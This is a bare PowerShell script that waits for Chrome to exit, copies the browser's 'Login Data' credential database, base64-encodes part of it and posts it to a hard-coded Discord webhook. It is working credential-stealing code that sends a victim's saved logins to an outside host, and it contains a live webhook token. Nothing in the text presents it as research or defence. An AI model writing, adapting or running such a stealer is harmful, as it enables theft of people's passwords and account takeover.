$filePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
$copyPath = "$env:TEMP\LoginDataCopy"

# Function to check if Chrome is running and wait until it's closed
function Wait-ForChromeToClose {
    while (Get-Process -Name "chrome" -ErrorAction SilentlyContinue) {
        Write-Host "Waiting for Chrome to close..."
        Start-Sleep -Seconds 3
    }
}

# Wait until Chrome closes before proceeding
Wait-ForChromeToClose
Write-Host "Chrome closed. Proceeding to copy file..."

try {
    Copy-Item -LiteralPath $filePath -Destination $copyPath -Force -ErrorAction Stop
    Write-Host "File copied successfully to $copyPath"
} catch {
    Write-Host "Failed to copy file. It might still be locked or inaccessible."
    exit
}

try {
    $fileBytes = [System.IO.File]::ReadAllBytes($copyPath)
} catch {
    Write-Host "Failed to read copied file."
    exit
}

if (-not $fileBytes -or $fileBytes.Length -eq 0) {
    Write-Host "File is empty or could not be read."
    exit
}

$fileBase64 = [Convert]::ToBase64String($fileBytes)

# Limit preview length to avoid too large Discord messages
if ($fileBase64.Length -gt 1500) {
    $fileBase64 = $fileBase64.Substring(0, 1500) + "..."
}

# Prepare JSON payload
$jsonPayload = '{"content":"Base64 preview of Login Data:`n```' + $fileBase64 + '```"}'

# Your Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1374075895941169322/0q_M5862QHhmUHeIUIu9b0Y_L2feBqu-tbTz3gsbEiASX5HtOc8gwfh5fNMajSnbCrOq"

try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType 'application/json'
    Write-Host "Base64 preview sent to Discord webhook."
} catch {
    Write-Host "Failed to send message to Discord webhook."
}
